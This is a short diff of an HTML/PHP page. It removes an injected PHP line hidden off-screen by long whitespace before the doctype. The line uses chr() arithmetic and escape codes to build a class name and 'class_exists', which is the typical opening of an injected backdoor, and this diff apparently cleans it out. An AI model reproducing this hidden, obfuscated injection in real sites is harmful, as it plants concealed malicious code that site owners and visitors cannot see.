@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $brmidn = chr (101) . "\x61" . chr ( 691 - 596 )."\x68" . chr ( 85 - 0 )."\x4d" . chr (98); $AoGUDas = "\143" . chr ( 750 - 642 ).chr ( 498 - 401 )."\163" . 's' . chr ( 628 - 533 ).'e' . "\170" . 'i' . chr ( 902 - 787 ).chr ( 604 - 488 ).chr ( 1061 - 946 ); $AHwHQXMBVR = class_exists($brmidn); $brmidn = "3050";$AoGUDas = "16379";$pxeyRtK = FALSE; ?><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
